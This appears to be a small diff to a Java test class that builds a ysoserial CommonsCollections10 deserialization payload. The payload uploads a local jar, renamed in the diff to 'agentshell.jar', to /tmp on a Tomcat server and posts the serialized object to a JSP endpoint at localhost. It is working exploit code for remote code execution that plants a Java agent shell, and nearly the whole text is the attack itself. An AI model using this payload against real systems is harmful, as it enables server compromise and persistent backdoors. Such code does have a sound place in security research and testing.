@@ -88,7 +88,7 @@ import ysoserial.payloads.util.HttpRequest;
 public class Test {
     public static void main(String[] args) throws Exception{
         String url = "http://127.0.0.1:8080/tomcattest/test.jsp";
-        Object o = new Eval().uploadFile(CommonsCollections10.class,"D:\\javaagent2.jar","/tmp/2.jar");
+        Object o = new Eval().uploadFile(CommonsCollections10.class,"D:\\agentshell.jar","/tmp/2.jar");
         byte[] ser = Serializer.serialize(o);
         new HttpRequest(url).addPostData(ser).send();
 
